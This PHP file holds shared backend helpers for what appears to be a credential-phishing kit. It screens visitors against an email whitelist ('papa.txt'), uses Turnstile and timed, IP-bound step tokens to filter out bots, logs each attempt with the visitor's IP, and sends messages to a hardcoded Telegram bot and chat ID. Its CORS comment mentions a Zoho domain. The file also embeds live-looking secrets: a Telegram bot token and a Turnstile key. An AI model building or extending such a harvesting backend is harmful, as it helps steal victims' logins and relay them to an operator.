<?php
// backend_common.php

// === CONFIG ===

// Log file on Railway volume
define('ATTEMPTS_FILE', '/data/attempts.json');

// Toggle email whitelist ON/OFF
define('EMAIL_VALIDATION_ENABLED', true);

// Cloudflare Turnstile secret (backend)
define('TURNSTILE_SECRET', '0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc');

// Whitelist file
define('WHITELIST_FILE', __DIR__ . '/papa.txt');

// Token secret for step token (set this in Railway env if possible)
define('TOKEN_SECRET', getenv('TOKEN_SECRET') ?: 'CHANGE_ME_TO_A_RANDOM_SECRET');

// Step token TTL (seconds)
define('STEP_TOKEN_TTL', 600); // 10 minutes

// Telegram
$TELEGRAM_BOT_TOKEN = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
$TELEGRAM_CHAT_ID   = "6915371044";

// === HELPERS ===

function add_cors_headers() {
    // If you want to restrict to Zoho domain, replace * with that origin
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
}

function handle_cors_preflight_if_needed() {
    add_cors_headers();
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(204);
        exit;
    }
}

function json_response(array $data, int $statusCode = 200) {
    add_cors_headers();
    http_response_code($statusCode);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data);
    exit;
}

function get_client_ip() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function load_attempts(): array {
    if (!file_exists(ATTEMPTS_FILE)) return [];
    $raw = file_get_contents(ATTEMPTS_FILE);
    $data = json_decode($raw, true);
    return is_array($data) ? $data : [];
}

function save_attempts(array $attempts): void {
    @file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT), LOCK_EX);
}

function load_whitelist(): array {
    if (!file_exists(WHITELIST_FILE)) return [];
    $lines = file(WHITELIST_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return array_map('trim', $lines);
}

function base64url_encode(string $data): string {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64url_decode(string $data): string {
    $remainder = strlen($data) % 4;
    if ($remainder) {
        $data .= str_repeat('=', 4 - $remainder);
    }
    return base64_decode(strtr($data, '-_', '+/'));
}

/**
 * Issue a signed step token containing email, ip, iat.
 */
function issue_step_token(string $email, string $ip): string {
    $payload = [
        'email' => $email,
        'ip'    => $ip,
        'iat'   => time()
    ];
    $json = json_encode($payload);
    $sig  = hash_hmac('sha256', $json, TOKEN_SECRET, true);

    return base64url_encode($json) . '.' . base64url_encode($sig);
}

/**
 * Validate step token: signature, TTL, IP.
 * Returns payload array or false on failure.
 */
function validate_step_token(string $token) {
    $parts = explode('.', $token);
    if (count($parts) !== 2) return false;

    [$payloadB64, $sigB64] = $parts;
    $payloadJson = base64url_decode($payloadB64);
    $sig         = base64url_decode($sigB64);

    if ($payloadJson === false || $sig === false) return false;

    $calcSig = hash_hmac('sha256', $payloadJson, TOKEN_SECRET, true);
    if (!hash_equals($calcSig, $sig)) return false;

    $payload = json_decode($payloadJson, true);
    if (!is_array($payload)) return false;

    // TTL check
    $now = time();
    if (empty($payload['iat']) || ($now - $payload['iat']) > STEP_TOKEN_TTL) {
        return false;
    }

    // IP binding (soft)
    $currentIp = get_client_ip();
    if (empty($payload['ip']) || $payload['ip'] !== $currentIp) {
        return false;
    }

    // Optional: min-time from step1 to step2
    if (($now - $payload['iat']) < 3) {
        // less than 3s old, suspicious
        return false;
    }

    return $payload;
}

/**
 * Simple Telegram notification.
 */
function send_telegram(string $text) {
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    $url = "https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage" .
           "?chat_id={$TELEGRAM_CHAT_ID}&text=" . urlencode($text);
    @file_get_contents($url);
}
